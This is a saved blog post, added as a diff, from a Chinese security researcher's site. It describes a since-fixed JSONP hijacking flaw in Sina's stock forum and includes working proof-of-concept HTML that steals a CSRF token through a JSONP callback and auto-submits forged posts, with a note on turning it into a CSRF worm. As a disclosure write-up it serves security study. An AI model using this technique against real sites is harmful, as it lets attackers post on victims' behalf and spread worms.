@@ -1,0 +1,394 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>分享一个jsonp劫持造成的新浪某社区CSRF蠕虫 | 离别歌</title>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/styles.css" rel="stylesheet"/>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/style.css" rel="stylesheet"/>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/jquery.min.js"></script>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/code.css" rel="stylesheet"/>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/button.css" rel="stylesheet"/>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html&amp;text=%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAjsonp%E5%8A%AB%E6%8C%81%E9%80%A0%E6%88%90%E7%9A%84%E6%96%B0%E6%B5%AA%E6%9F%90%E7%A4%BE%E5%8C%BACSRF%E8%A0%95%E8%99%AB"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html&amp;title=%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAjsonp%E5%8A%AB%E6%8C%81%E9%80%A0%E6%88%90%E7%9A%84%E6%96%B0%E6%B5%AA%E6%9F%90%E7%A4%BE%E5%8C%BACSRF%E8%A0%95%E8%99%AB"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html&amp;is_video=false&amp;description=%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAjsonp%E5%8A%AB%E6%8C%81%E9%80%A0%E6%88%90%E7%9A%84%E6%96%B0%E6%B5%AA%E6%9F%90%E7%A4%BE%E5%8C%BACSRF%E8%A0%95%E8%99%AB"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAjsonp%E5%8A%AB%E6%8C%81%E9%80%A0%E6%88%90%E7%9A%84%E6%96%B0%E6%B5%AA%E6%9F%90%E7%A4%BE%E5%8C%BACSRF%E8%A0%95%E8%99%AB&amp;body=Check out this article: https%3A//www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html&amp;title=%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAjsonp%E5%8A%AB%E6%8C%81%E9%80%A0%E6%88%90%E7%9A%84%E6%96%B0%E6%B5%AA%E6%9F%90%E7%A4%BE%E5%8C%BACSRF%E8%A0%95%E8%99%AB"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html&amp;title=%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAjsonp%E5%8A%AB%E6%8C%81%E9%80%A0%E6%88%90%E7%9A%84%E6%96%B0%E6%B5%AA%E6%9F%90%E7%A4%BE%E5%8C%BACSRF%E8%A0%95%E8%99%AB"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html&amp;title=%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAjsonp%E5%8A%AB%E6%8C%81%E9%80%A0%E6%88%90%E7%9A%84%E6%96%B0%E6%B5%AA%E6%9F%90%E7%A4%BE%E5%8C%BACSRF%E8%A0%95%E8%99%AB"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html&amp;title=%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAjsonp%E5%8A%AB%E6%8C%81%E9%80%A0%E6%88%90%E7%9A%84%E6%96%B0%E6%B5%AA%E6%9F%90%E7%A4%BE%E5%8C%BACSRF%E8%A0%95%E8%99%AB"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html&amp;name=%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAjsonp%E5%8A%AB%E6%8C%81%E9%80%A0%E6%88%90%E7%9A%84%E6%96%B0%E6%B5%AA%E6%9F%90%E7%A4%BE%E5%8C%BACSRF%E8%A0%95%E8%99%AB&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">分享一个jsonp劫持造成的新浪某社区CSRF蠕虫</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2015年6月20日 15:19" itemprop="datePublished">
+                    2015 六月 20 15:19
+                </time>
+</div>
+<div class="article-tag">
+            阅读：6008
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/HTML">web前端</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/jsonp">jsonp</a>,
+                
+                <a class="tag-link" href="/tag/CSRF%E6%BC%8F%E6%B4%9E">CSRF漏洞</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>最近jsonp很火，实话说已经是被玩烂了的，只是一直没有受到大家的重视。正好在上个月，我挖过一个由于jsonp造成的新浪某社区CSRF，当时是为了准备一篇文章，之后这篇文章也会拿出来分享。</p>
+<p>因为新浪已经修复了问题，所以我先把这个漏洞分享出来。以下是当时写的部分文章。</p>
+<h2 id="0x01"><a class="toclink" href="#0x01">0x01 引子</a></h2>
+<p>听说新浪五月送衣服，我其实也没太多空去挖洞。本来想交一个两年前挖的CSRF刷粉，结果拿出来一看那洞早没了，目标站都换了。</p>
+<p>详细说，就是我那个洞被302跳转到新浪股吧（<a href="http://guba.sina.com.cn/"><a href="http://guba.sina.com.cn/">http://guba.sina.com.cn/</a></a>）去了。</p>
+<p>最近股市很火啊，多少人在股市里发家致富。于是我简单开着burpsuite在股吧里转了一圈，发现了一处有意思的CSRF。</p>
+<p>新浪微博玩的多的同学都知道新浪针对CSRF漏洞的防御策略是检查Referer，但股吧发帖这里却不是，少见地检查是token。</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/29551434785656.png"><img alt="image001.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-29551434785656.png"/></a></p>
+<p>如图，抓一个正常发帖的POST数据包，我们可以看到其中含有_csrf_token这个字段。经过简单FUZZ发现，这个请求是不检查Referer的，只要_csrf_token正确即可发帖。</p>
+<p>那么，如何获取_csrf_token，我有如下思路：</p>
+<ol>
+<li>查看本站是否有泄漏token的jsonp</li>
+<li>通过flash窃取源码</li>
+</ol>
+<p>为什么我会有以上思路？首先，获取token一定是一个跨域过程，跨域的话通常就是CORS、postMessage和jsonp，这里CORS和postMessage都是不存在的，那么我就去找jsonp。</p>
+<p>flash的思路应该已经流传已久了，去年这个时候/fd就已经在drops里说到了这个：<a href="http://drops.wooyun.org/tips/2031"><a href="http://drops.wooyun.org/tips/2031">http://drops.wooyun.org/tips/2031</a></a></p>
+<p>但法2有一个很重要的条件是我们需要找到一个能控制输出内容的点，如上传、jsonp等，但实际上这样的位置并不好找，利用起来不如第一种方法简单。</p>
+<h2 id="0x02-jsonp_csrf_token"><a class="toclink" href="#0x02-jsonp_csrf_token">0x02 jsonp出卖了你的_csrf_token</a></h2>
+<p>那么，跟着自己的思路来测试。</p>
+<p>我先将_csrf_token修改成随意一个字符串，发送发现返回这样一个结果：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/25ae1434785659.png"><img alt="image003.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-25ae1434785659.png"/></a></p>
+<p>返回的数据包是一个json格式的字符串，其中包含了一个_csrf_token。多次发送这个数据包，我发现这个token每次都会变化。</p>
+<p>那么我大概可以猜到，股吧的token是一个动态生成的，应该是储存在session中，每次检查完成后会生成一个新的。</p>
+<p>但这里是json格式的返回值，而非jsonp。</p>
+<p>于是我在GET参数中加入<code>&amp;callback=hehehe</code>试试：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/f3c81434787636.png"><img alt="image005.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-f3c81434787636.png"/></a> </p>
+<p>很明显，返回的格式变了。虽然不是jsonp，但却是一个&lt;script&gt;了。</p>
+<p>为什么加上callback=hehehe就变了？这应该是一个开发习惯，通常开发设计api的时候都会有json和jsonp两种格式，而通常取jsonp的函数名的变量名就是callback。</p>
+<p>这里是<code>&lt;script&gt;</code>还是没法跨域呀，parent.hehehe执行父框架中的hehehe函数，但父框架（10.211.55.3）和guba.sina.com.cn还是不同域，chrome下会爆出这个错误：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/46071434785692.png"><img alt="image007.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-46071434785692.png"/></a> </p>
+<p>继续尝试，将HTTP方法改成GET：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/7dfd1434785696.png"><img alt="image009.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-7dfd1434785696.png"/></a></p>
+<p>惊喜，方法一变就得到jsonp了。</p>
+<p>那么我用这个jsonp里的_csrf_token试试能不能成功发帖：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/e1fb1434785700.png"><img alt="image011.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-e1fb1434785700.png"/></a> </p>
+<p>悲剧的是，不行……</p>
+<p>那么我有两个猜想</p>
+<ol>
+<li>_csrf_token和HTTP方法有关，GET方法只能痛GET方法获取的token，POST用POST的token</li>
+<li>_csrf_token和“吧id”有关，不同id对应不同token。原因是返回错误的原因里多次提到“缺少参数:吧id或吧名”。</li>
+</ol>
+<p>第一个猜想被我的程序员直觉否定了，我没见过有这样写程序的。</p>
+<p>我尝试第二个猜想，在GET数据包的URL中加上&amp;bid=9947，再次发送数据包： </p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/47c11434785703.png"><img alt="image013.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-47c11434785703.png"/></a></p>
+<p>仍然是jsonp格式，我将这个token再写入post数据包中发送：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/4c4f1434785707.png"><img alt="image015.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-4c4f1434785707.png"/></a></p>
+<p>成功了！</p>
+<p>一个jsonp将_csrf_token彻底出卖了。</p>
+<h2 id="0x03-poc"><a class="toclink" href="#0x03-poc">0x03 构造POC发表任意帖子</a></h2>
+<p>那么我开始编写POC来完成刚才手工完成的步骤。思路如下：</p>
+<ol>
+<li>jsonp获得token</li>
+<li>构造POST表单提交</li>
+</ol>
+<p>先构造一个获取token的简单代码：</p>
+<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>test<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span><span class="p">&gt;</span>
+<span class="kd">function</span> <span class="nx">hehehe</span><span class="p">(</span><span class="nx">obj</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
+    <span class="nx">alert</span><span class="p">(</span><span class="nx">obj</span><span class="p">[</span><span class="s2">"result"</span><span class="p">][</span><span class="s2">"data"</span><span class="p">][</span><span class="s2">"_csrf_token"</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span> <span class="na">src</span><span class="o">=</span><span class="s">“http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&amp;callback=hehehe&amp;bid=9947"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>效果如图：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/37991434785716.png"><img alt="image017.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-37991434785716.png"/></a></p>
+<p>已经获取到token了。</p>
+<p>这时候，将token嵌入表单中提交即可：</p>
+<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>test<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="na">id</span><span class="o">=</span><span class="s">"csrfsend"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"bid"</span> <span class="na">value</span><span class="o">=</span><span class="s">"9947"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"tid"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"content"</span> <span class="na">value</span><span class="o">=</span><span class="s">"这是测试结果"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"title"</span> <span class="na">value</span><span class="o">=</span><span class="s">"这是测试标题"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">id</span><span class="o">=</span><span class="s">"token"</span> <span class="na">name</span><span class="o">=</span><span class="s">"_csrf_token"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"anonymous"</span> <span class="na">value</span><span class="o">=</span><span class="s">"1"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span><span class="p">&gt;</span>
+<span class="kd">function</span> <span class="nx">hehehe</span><span class="p">(</span><span class="nx">obj</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">csrf_token</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">[</span><span class="s2">"result"</span><span class="p">][</span><span class="s2">"data"</span><span class="p">][</span><span class="s2">"_csrf_token"</span><span class="p">];</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"token"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">csrf_token</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"csrfsend"</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span> <span class="na">src</span><span class="o">=</span><span class="s">"http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&amp;callback=hehehe&amp;bid=9947"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>以上代码，保存为sinacsrf.html，任意用户访问后即可触发，在板块9947发表一篇新帖子：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/d7151434785727.png"><img alt="image019.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-d7151434785727.png"/></a> </p>
+<p>如图可见已发表：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201506/b2691434785731.png"><img alt="image021.png" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/thum-b2691434785731.png"/></a> </p>
+<p>这就是一个很典型的CSRF漏洞，通过jsonp窃取token来绕过后端的检查。</p>
+<p>发表的帖子里还能再贴入链接，引诱其他用户点击，点击访问再次发帖，造成一个CSRF蠕虫。</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2404">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">我</a>
+<time datetime="2016年8月4日 10:34" itemprop="datePublished">
+                            2016 八月 04 10:34
+                        </time>
+<a href="javascript:reply_to('2404', '我')">回复</a>
+</p>
+<p class="comment-meta">是</p>
+</div>
+</div>
+<div class="row" id="comment-2247">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/ddc578f425f907c5b1bc615f52e7ded3.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.hackang.com" target="_blank">Xenc</a>
+<time datetime="2015年11月7日 20:35" itemprop="datePublished">
+                            2015 十一月 07 20:35
+                        </time>
+<a href="javascript:reply_to('2247', 'Xenc')">回复</a>
+</p>
+<p class="comment-meta">请问站长知道怎么伪造referer不</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2248">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2015年11月8日 00:29" itemprop="datePublished">
+                            2015 十一月 08 00:29
+                        </time>
+<a href="javascript:reply_to('2248', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@Xenc：CSRF中并不能伪造ref</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2172">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/ad327644d5b3a6d2394e9548fd3580d1.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">晴天小猪</a>
+<time datetime="2015年7月22日 19:09" itemprop="datePublished">
+                            2015 七月 22 19:09
+                        </time>
+<a href="javascript:reply_to('2172', '晴天小猪')">回复</a>
+</p>
+<p class="comment-meta">我想知道 新浪是怎么修复的。<br>。。因为人家已经有了cstf token了。<br><br/>还有我看你写的	name="anonymous" value="1"是匿名发布的。<br/>如果guba.com禁止发布匿名帖，而根据同源策略又不能获得登陆用户cookie，是不是就相当于csrf不存在了。</br></br></p>
+</div>
+</div>
+<div class="row" id="comment-2170">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/66c81a4f074b40e9acbfd284493c4e81.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.92af.com" target="_blank">af</a>
+<time datetime="2015年7月20日 16:46" itemprop="datePublished">
+                            2015 七月 20 16:46
+                        </time>
+<a href="javascript:reply_to('2170', 'af')">回复</a>
+</p>
+<p class="comment-meta">非常给力呢。</p>
+</div>
+</div>
+<div class="row" id="comment-2162">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/f5687a77e4e84f9d953463c75061c609.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.daquan8.com/emlog/63.html" target="_blank">菠萝格格</a>
+<time datetime="2015年7月6日 19:19" itemprop="datePublished">
+                            2015 七月 06 19:19
+                        </time>
+<a href="javascript:reply_to('2162', '菠萝格格')">回复</a>
+</p>
+<p class="comment-meta">真纳闷你们是怎么发现的</p>
+</div>
+</div>
+<div class="row" id="comment-2157">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://stayliv3.github.io/" target="_blank">xd</a>
+<time datetime="2015年6月23日 14:24" itemprop="datePublished">
+                            2015 六月 23 14:24
+                        </time>
+<a href="javascript:reply_to('2157', 'xd')">回复</a>
+</p>
+<p class="comment-meta">加callback参数，改成get方法，加bid参数，这过程太赞了。非程序员想不出来啊。</p>
+</div>
+</div>
+<div class="row" id="comment-2153">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">DBA</a>
+<time datetime="2015年6月20日 22:50" itemprop="datePublished">
+                            2015 六月 20 22:50
+                        </time>
+<a href="javascript:reply_to('2153', 'DBA')">回复</a>
+</p>
+<p class="comment-meta">过程非常赞</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="a0e6d825c6307de8c3c0b3f2ec6de589ff1ddae4"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/a0e6d825c6307de8c3c0b3f2ec6de589ff1ddae4"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="363">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="NvFx9b7Ma0xSLT1UfoeRRZ5nJwd0hNVklP03XFj1BNrhLyp93FIBqD7sSAG80hKu"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./分享一个jsonp劫持造成的新浪某社区CSRF蠕虫  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
